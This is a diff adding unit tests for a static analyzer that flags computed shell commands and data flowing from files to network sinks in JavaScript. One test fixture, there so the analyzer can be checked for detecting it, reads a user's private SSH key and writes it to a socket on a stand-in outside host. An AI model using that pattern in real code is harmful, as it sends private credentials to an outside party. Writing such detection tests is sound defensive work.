@@ -187,6 +187,43 @@ describe('analyzeCode flow metadata', () => {
     expect(built).toMatchObject({ command: 'open ${…}', dynamic: true });
     expect(decoded).toMatchObject({ decoded: true, dynamic: true });
   });
+
+  it('a number interpolated into a command does not make it computed', () => {
+    const [num, str] = analyzeCode([
+      'execSync(`ps -o stat= -p ${Number(pid)}`);',
+      'execSync(`ps -o stat= -p ${pid}`);',
+    ].join('\n'), 'p.js').filter((r) => r.type === 'eval-exec');
+    expect(num.dynamic).toBeUndefined();
+    expect(str.dynamic).toBe(true);
+  });
+});
+
+describe('the process\'s own output and helpers that use the environment', () => {
+  it('printing a file to stdout or stderr is no network flow', () => {
+    const code = [
+      'const { readFileSync } = require("fs");',
+      'process.stdout.write(readFileSync(p));',
+      'process["stderr"].write(readFileSync(p, "utf8"));',
+    ].join('\n');
+    expect(analyzeCode(code, 'cat.js').filter((r) => r.type === 'source-to-sink')).toEqual([]);
+  });
+
+  it('a socket write of the same file still is', () => {
+    const code = [
+      'const fs = require("fs"); const net = require("net");',
+      'const s = net.connect(443, "collect.example.net");',
+      's.write(fs.readFileSync("/home/alice/.ssh/id_rsa"));',
+    ].join('\n');
+    expect(analyzeCode(code, 'x.js').filter((r) => r.type === 'source-to-sink')).toHaveLength(1);
+  });
+
+  it('a function defaulting a parameter to process.env is not the environment', () => {
+    const code = [
+      'const { spawnSync } = require("child_process");',
+      'const git = (args, env = process.env) => spawnSync("git", args, { env });',
+    ].join('\n');
+    expect(analyzeCode(code, 'git.js').filter((r) => r.type === 'source-to-sink')).toEqual([]);
+  });
 });
 
 
